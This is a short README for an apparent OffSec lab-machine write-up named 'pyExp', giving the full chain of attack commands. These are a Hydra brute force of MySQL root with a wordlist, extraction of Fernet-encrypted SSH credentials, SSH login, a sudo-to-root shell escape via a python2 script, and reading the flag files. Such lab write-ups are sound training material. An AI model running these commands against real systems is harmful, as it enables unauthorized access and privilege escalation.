# Offsec-pyExp

```
Usage : python3 resolv-pyExp.py -i <IP_ADDRESS> -p 3306 -w <WORDLIST>

```

Specific Steps for pyExp

Reconnaissance: Scan to identify running services, particularly MySQL (tcp/3306) and SSH (tcp/1337).

Brute Force MySQL: Use Hydra to brute force MySQL access using the wordlist /usr/share/wordlist/rockyou.txt.

```bash
hydra -l root -P <WORDLIST> mysql://<IP_ADDRESS>:3306
```
Database Access: Extract the encrypted SSH credentials via the symmetric Fernet algorithm from the `data` table.

SSH Connection: Decrypt the credentials and connect via SSH on tcp/1337.

```bash
ssh <user>@<IP_ADDRESS> -p 1337
```
Privilege Escalation: The user 'lucy' can execute a script with root privileges without a password. Use it for privilege escalation.

```bash
sudo /usr/bin/python2 /opt/exp.py
import pty;pty.spawn("/bin/bash")
```

Flag Retrieval: Read the local.txt and proof.txt files after privilege escalation.

```bash
cat local.txt
cat /root/proof.txt
```
### Image
![offsec-pyExp1](https://github.com/Isid0r3/Offsec-pyExp/assets/120736091/14d169b5-e627-49d8-9c90-15a7ccd9bd16)


Credits : [Isid0r3](https://www.linkedin.com/in/isid0r3) & [Jedidia](https://linkedin.com/in/jedidia-d-bahena-0814161b7)
